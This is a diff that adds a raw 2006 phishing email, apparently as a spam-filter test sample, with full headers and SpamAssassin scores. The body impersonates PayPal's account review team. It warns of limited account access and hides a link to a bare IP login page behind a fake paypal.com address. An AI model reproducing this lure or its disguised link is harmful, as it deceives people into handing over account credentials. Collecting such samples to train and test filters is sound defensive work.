@@ -1,0 +1,97 @@
+From nobody Sun Jan 25 13:48:12 2015
+Return-Path: <kate@roxiware.com>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail2.example.com (mail2.example.com [10.3.4.5])
+ by naughty.example.com (Postfix) with ESMTP id 33282536FCC
+ for <nobody@login.example.com>; Tue, 10 Jan 2006 20:46:57 -0500 (EST)
+Received: from mail2.example.com (localhost.example.com [127.0.0.1])
+ by mail2.example.com (Postfix) with ESMTP id B14376FA3D0
+ for <nobody@example.com>; Tue, 10 Jan 2006 20:46:55 -0500 (EST)
+Received: from lujan.example.com (foo.example.com [10.2.3.4])
+ by mail2.example.com (Postfix) with ESMTP
+ for <nobody@example.com>; Tue, 10 Jan 2006 20:46:55 -0500 (EST)
+Received: by lujan.example.com (Postfix)
+ id EA5A81BC60; Wed, 11 Jan 2006 02:46:24 +0100 (CET)
+Delivered-To: foobee@example.com
+Received: from localhost (unknown [127.0.0.1])
+ by lujan.example.com (Postfix) with ESMTP id 8A2FC1BC51
+ for <foobee@example.com>; Wed, 11 Jan 2006 01:46:24 +0000 (UTC)
+Received: from lujan.example.com ([10.2.3.4])
+ by localhost (lujan [10.2.3.4]) (amavisd-new, port 10024)
+ with ESMTP id 20673-10 for <foobee@example.com>;
+ Wed, 11 Jan 2006 02:46:09 +0100 (CET)
+Received: from mail.roxiware.com (pia130-122.pioneernet.net [66.114.130.122])
+ by lujan.example.com (Postfix) with ESMTP id 1D0A51BC17
+ for <foobee@example.com>; Wed, 11 Jan 2006 02:46:08 +0100 (CET)
+Received: by mail.roxiware.com (Postfix, from userid 1104)
+ id 7E3077F75; Sun,  8 Jan 2006 14:21:18 -0800 (PST)
+To: foobee@example.com
+Subject: Notification of Limited Account Access (Routing Code:
+ C840-L001-Q190-T1812)
+From: service@paypal.com <service@paypal.com>
+Content-Type: text/html
+Message-Id: <20060108222118.7E3077F75@mail.roxiware.com>
+Date: Sun,  8 Jan 2006 14:21:18 -0800 (PST)
+X-Virus-Scanned: by amavisd-new-20030616-p10 (Debian) at example.com
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: **
+X-Spam-Status: No, score=2.3 required=5.0 tests=DEAR_SOMETHING,HTML_10_20,
+ HTML_MESSAGE,HTML_MIME_NO_HTML_TAG,MIME_HEADER_CTYPE_ONLY,
+ MIME_HTML_ONLY,NORMAL_HTTP_TO_IP autolearn=no version=3.0.2
+X-Spam-Report: *  1.6 DEAR_SOMETHING BODY: Contains 'Dear (something)'
+ *  0.0 NORMAL_HTTP_TO_IP URI: Uses a dotted-decimal IP address in URL
+ *  0.0 HTML_MESSAGE BODY: HTML included in message
+ *  0.2 HTML_10_20 BODY: Message is 10% to 20% HTML
+ *  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+ * 0.1 MIME_HEADER_CTYPE_ONLY 'Content-Type' found without required MIME
+ headers
+ *  0.1 HTML_MIME_NO_HTML_TAG HTML-only message, but there is no HTML tag
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 217
+
+
+<div id=message>
+
+
+
+
+<BR>Dear Sir,<BR><BR>PayPal is committed to maintaining a safe environment for its 
+community of<BR>buyers and sellers.
+To protect the security of your account, PayPal employs<BR>some of the most advanced 
+security systems in the world and
+our anti-fraud<BR>teams regularly screen the PayPal system for unusual 
+activity.<BR><BR>Recently, our Account Review
+Team identified some unusual activity in your<BR>account. In accordance with PayPal's User 
+Agreement and to ensure that
+your<BR>account has not been compromised, access to your account was limited. 
+Your<BR>account access will remain
+limited until this issue has been resolved. This<BR>is a fraud prevention measure meant to 
+ensure that your account is
+ not<BR>compromised.<BR><BR>In order to secure your account and quickly restore full 
+access, we may<BR>require some
+specific information from you for the following reason: <BR><BR>We would like to ensure 
+that your account was not
+accessed by an<BR>unauthorized third party. Because protecting the security of your 
+account<BR>is our primary concern,
+we have limited access to sensitive PayPal account<BR>features. We understand that this 
+may be an inconvenience but
+please<BR>understand that this temporary limitation is for your protection. <BR><BR>Case 
+ID Number:
+PP-046-631-789<BR>We encourage you to log in and restore full access as soon as 
+possible.<BR>Should access to your
+account remain limited for an extended period of<BR>time, it may result in further 
+limitations on the use of your
+account or<BR>may result in eventual account closure.<BR><BR>Thank you for your prompt 
+attention to this matter. Please
+understand that<BR>this is a security measure meant to help protect you and your
+ account. We<BR>apologize for any inconvenience.<BR><BR>
+<BR>To keep your account active, click here:<BR>
+<a target="_blank"  HREF=http://200.9.189.73/.smsac/index.php?MfcISAPICommand=SignInFPP
+target="_self"> 
+http://www.paypal.com/cgi-bin/webscr?cmd=p/gen/accounts-outside</a><BR><BR><BR>Sincerely,<BR>PayPal
+Account Review Department<BR><BR><BR><BR>PayPal Email ID PP576<BR></DIV>
+
+</div>
